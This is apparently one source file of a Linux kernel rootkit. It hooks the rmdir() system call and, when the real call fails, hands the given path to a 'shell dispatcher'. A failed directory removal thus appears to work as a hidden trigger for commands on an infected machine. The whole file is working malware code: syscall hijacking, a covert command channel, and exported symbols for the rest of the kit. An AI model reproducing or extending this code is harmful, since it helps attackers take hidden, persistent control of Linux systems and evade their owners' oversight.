#include <linux/module.h>
#include <linux/slab.h>

// ////////////////////////////////////////////////////////////////////
// ////////////////////////////////////////////////////////////////////

#include "../../logger/logger.h"
#include "../../shell/dispatcher.h"
#include "../utils.h"
#include "rmdir.h"

// ////////////////////////////////////////////////////////////////////
// ////////////////////////////////////////////////////////////////////

asmlinkage long (*real_rmdir)(const struct pt_regs *);

// ////////////////////////////////////////////////////////////////////

asmlinkage long hook_rmdir(const struct pt_regs *regs) {
    const void *pathname = SYSCALL_ARG1(regs, void *);
    char *kernel_filename = duplicate_filename(pathname);

    rk_info("rmdir() hooked for: %s\n", kernel_filename);

    const long ret = real_rmdir(regs);

    if (ret == 0) {
        kfree(kernel_filename);
        return ret;
    }

    dispatcher(kernel_filename);

    kfree(kernel_filename);

    // rk_info("rmdir() true return: %ld\n", ret);

    return ret;
}

// ////////////////////////////////////////////////////////////////////
// ////////////////////////////////////////////////////////////////////

EXPORT_SYMBOL(hook_rmdir);
EXPORT_SYMBOL(real_rmdir);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Aspheric_");
MODULE_DESCRIPTION("Hooks rmdir");
